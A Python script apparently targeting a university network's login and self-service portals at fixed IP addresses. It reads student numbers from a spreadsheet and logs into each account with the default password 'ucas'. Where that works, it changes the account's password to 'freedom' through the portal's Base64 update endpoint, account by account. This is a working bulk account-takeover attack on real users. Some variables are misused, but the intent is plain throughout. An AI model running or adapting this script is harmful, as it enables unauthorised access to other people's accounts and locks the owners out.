import gzip
import re
import http.cookiejar
import urllib.request
import urllib.parse
import xlrd
import time
import xlwt

def write_excel(student_num,file):
    book = xlwt.Workbook(encoding='utf-8',style_compression=0)
    sheet = book.add_sheet('sheet1',cell_overwrite_ok=True)
    i = 0
    for num in student_num:
        sheet.write(i,0,num)
        i = i+1
    book.save(file)



def open_excel(file):
    try:
        data = xlrd.open_workbook(file)
        return data
    except Exception as e:
        print(str(e))


def excel_table_byindex(file, start=0, index=0):
    data = open_excel(file)
    table = data.sheets()[index]
    nrows = table.nrows
    num = []
    for nrows in range(start, nrows):
        num.append(table.cell(nrows, 0).value)
    return num


# 解压函数
def ungzip(data):
    try:  # 尝试解压
        #print('正在解压.....')
        data = gzip.decompress(data)
        #print('解压完毕!')
    except:
        #print('未经压缩, 无需解压')
        pass
    return data


# 获取_querystring
def getqueryString(data):
    pattern = r'wlanuserip.*?"'
    strlist = re.findall(pattern, data)
    stringlist = strlist[0]
    stringlist = stringlist[:-1]
    querystring = urllib.parse.quote(stringlist)  # querystring需要二次编码
    return querystring


# 获取userIndex
def getuserIndex(data):
    pattern = r'"userIndex":".*?"'
    strlist = re.findall(pattern, data)
    stringlist = strlist[0]
    userIndex = stringlist[13:-1]

    return userIndex


# 构造文件头
def getOpener(head):
    # 设置一个cookie处理器，它负责从服务器下载cookie到本地，并且在发送请求时带上本地的cookie
    cj = http.cookiejar.CookieJar()
    pro = urllib.request.HTTPCookieProcessor(cj)
    opener = urllib.request.build_opener(pro)
    header = []
    for key, value in head.items():
        elem = (key, value)
        header.append(elem)
    opener.addheaders = header
    return opener


def isSuccess(data):
    stateFlag = False
    pattern = r'success'
    strlist = re.findall(pattern, data)
    #strlist = strlist[0]
    if (len(strlist)):
        stateFlag = True
    return stateFlag


def isError(data):
    state = False
    pattern = r'用户不存在或密码错误'
    strlist = re.findall(pattern, data)
    #strlist = strlist[0]
    if (len(strlist)):
        state = True
        return state
    else:
        return state


def login(userInfo_url, login_url):
    userIndex = ''
    state = False
    opener = getOpener(header)
    op = opener.open(userInfo_url)
    data = op.read()
    querystring = getqueryString(data.decode())
    login_postDict = {
        # 特有数据，不同网站可能不同
        'service': '',
        'password': password,
        'userId': id,
        'operatorPwd': '',
        'vaildcode': '',

        'queryString': querystring
    }
    login_postData = urllib.parse.urlencode(login_postDict).encode()
    op = opener.open(login_url, login_postData)
    login_data = op.read()
    login_data = ungzip(login_data)
    decode_data = login_data.decode()
    if (isSuccess(decode_data)):
        userIndex = getuserIndex(decode_data)
        stateFlag = True
        return stateFlag, userIndex

    else:
        return state, userIndex


def logout(userIndex, logout_url):
    stateFlag = False
    opener = getOpener(header)
    logout_postDict = {
        'userIndex': userIndex
    }
    logout_postData = urllib.parse.urlencode(logout_postDict).encode()
    op = opener.open(logout_url, logout_postData)
    logout_data = op.read()
    logout_data = ungzip(logout_data)
    decode_data = logout_data.decode()
    if (isSuccess(decode_data)):
        stateFlag = True
        return stateFlag
    else:
        return stateFlag


def update_pwd(login_updatepwd_url, updatepwd_url):
    opener = getOpener(update_pwd_header)
    login_update_pwd_postDict = {
        'name': name,
        'password': password

    }
    login_update_pwd_postData = urllib.parse.urlencode(login_update_pwd_postDict).encode()
    op = opener.open(login_updatepwd_url, login_update_pwd_postData)
    login_data = op.read()
    login_data = ungzip(login_data)
    decode_data = login_data.decode("gbk")
    if (isError(decode_data)):
        print("登录失败")
        print(id)
        return False
    else:
        print("登陆成功")
        update_pwd_postDict = {
            'key': 'dWNhcw==:ZnJlZWRvbQ=='  # 'ucas',dWNhcw==;'freedom',ZnJlZWRvbQ==
        }
        update_pwd_postData = urllib.parse.urlencode(update_pwd_postDict).encode()
        op = opener.open(updatepwd_url, update_pwd_postData)
        print("密码修改成功")
        return True


# 构造header，一般header至少要包含一下两项。这两项是从抓到的包里分析得出的。
header = {
    'Connection': 'keep-alive',
    'Accept': 'text/html, application/xhtml+xml, */*',
    'Accept-Language': 'en-US,en;q=0.5',
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x84_64; rv:49.0) like Gecko',
    'Accept-Encoding': 'gzip, deflate',
    'Host': '210.77.16.21',
    'Uprade-Insecure-Requests': '1'
}

update_pwd_header = {
    'Connection': 'keep-alive',
    'Accept': 'text/html, application/xhtml+xml, application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x84_64; rv:49.0) like Gecko',
    'Accept-Encoding': 'gzip, deflate',
    'Host': '121.195.186.149',
    'Uprade-Insecure-Requests': '1'
}

password = 'ucas'

id = []
name=[]


userInfo_url = 'http://210.77.16.21/eportal//InterFace.do?method=getOnlineUserInfo'
login_url = 'http://210.77.16.21//eportal/InterFace.do?method=login'
logout_url = 'http://210.77.16.21//eportal/InterFace.do?method=logout'
login_updatepwd_url = 'http://121.195.186.149/selfservice/module/scgroup/web/login_judge.jsf'
updatepwd_url = 'http://121.195.186.149/selfservice/module/userself/web/userself_ajax.jsf?methodName=regUserinfoListBean.updateAjaxByBase64'

student_num = excel_table_byindex("id.xlsx")
for name in student_num:
    update_pwd(login_updatepwd_url,updatepwd_url)
    time.sleep(1)
print("mission complete")


